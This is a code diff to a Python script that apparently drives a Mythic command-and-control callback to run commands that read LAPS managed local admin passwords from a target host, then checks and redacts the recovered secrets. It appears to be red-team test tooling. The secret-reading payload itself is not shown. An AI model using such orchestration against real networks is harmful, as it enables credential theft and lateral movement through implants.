@@ -2,7 +2,7 @@
 """Bounded live proof for generic managed local admin secret reads.
 
 No LLM is used. The script builds Sage's payload-agnostic
-`read-managed-local-admin-secret` capability into a Mythic command, executes it
+`read-managed-local-admin-secret` capability into Mythic commands, executes them
 from a selected callback, and records the effect only when plaintext managed
 local admin password material is proven.
 """
@@ -38,6 +38,7 @@ USER = "mythic_admin"
 
 LAPS_VALUE_RE = re.compile(r"(?im)^(\s*ms(?:-mcs-admpwd|laps-password)\s*[:=]\s*).+$")
 ENCRYPTED_LAPS_RE = re.compile(r"(?im)^(\s*mslaps-encryptedpassword\s*[:=]\s*).+$")
+MANAGED_SECRET_EXPECTED_PROBE = "extract_managed_local_admin_secret_probe"
 
 
 def _redact(value: Any) -> Any:
@@ -90,6 +91,37 @@ def _callback_payload_type(callback: dict[str, Any]) -> str:
     payload = callback.get("payload") if isinstance(callback.get("payload"), dict) else {}
     payload_type = payload.get("payloadtype") if isinstance(payload.get("payloadtype"), dict) else {}
     return str(payload_type.get("name") or callback.get("payloadtype") or "")
+
+
+async def _execute_plan_commands(
+    tools: Any,
+    commands: list[Any],
+    callback_id: int,
+    timeout: int,
+) -> tuple[Any, int | None]:
+    proof_output: Any = ""
+    proof_task_id: int | None = None
+    for command in commands:
+        if not isinstance(command, dict):
+            continue
+        command_name = str(command.get("command") or "")
+        if not command_name:
+            continue
+        print(f"\nissuing {_command_summary(command)}")
+        output = await tools.issue_task_and_waitfor_task_output(
+            command_name,
+            command.get("parameters"),
+            callback_id,
+            timeout=timeout,
+        )
+        task_id = tools._last_issued_task_display_id
+        expected_probe = str(command.get("expected_probe") or "").casefold()
+        print(f"task_id={task_id} expected_probe={expected_probe}")
+        print(f"output_tail:\n{_tail(output)}")
+        if expected_probe == MANAGED_SECRET_EXPECTED_PROBE:
+            proof_output = output
+            proof_task_id = task_id
+    return proof_output, proof_task_id
 
 
 async def main() -> int:
@@ -155,20 +187,14 @@ async def main() -> int:
         print(json.dumps(_redact(plan), indent=2, sort_keys=True))
         return 1
 
-    command = (plan.get("commands") or [None])[0]
-    if not isinstance(command, dict):
-        print("ERROR: builder returned no command")
+    commands = list(plan.get("commands") or [])
+    if not any(isinstance(command, dict) and command.get("command") for command in commands):
+        print("ERROR: builder returned no commands")
         return 1
-    print(f"\nissuing {_command_summary(command)}")
-    output = await tools.issue_task_and_waitfor_task_output(
-        str(command.get("command") or ""),
-        command.get("parameters"),
-        args.callback,
-        timeout=args.timeout,
-    )
-    task_id = tools._last_issued_task_display_id
-    print(f"task_id={task_id} expected_probe={command.get('expected_probe')}")
-    print(f"output_tail:\n{_tail(output)}")
+    output, task_id = await _execute_plan_commands(tools, commands, args.callback, args.timeout)
+    if task_id is None:
+        print("ERROR: builder returned no managed-secret proof command")
+        return 1
 
     probe = capabilities.extract_managed_local_admin_secret_probe(output, args.target_host, args.target_domain)
     probe["callback_id"] = str(args.callback)
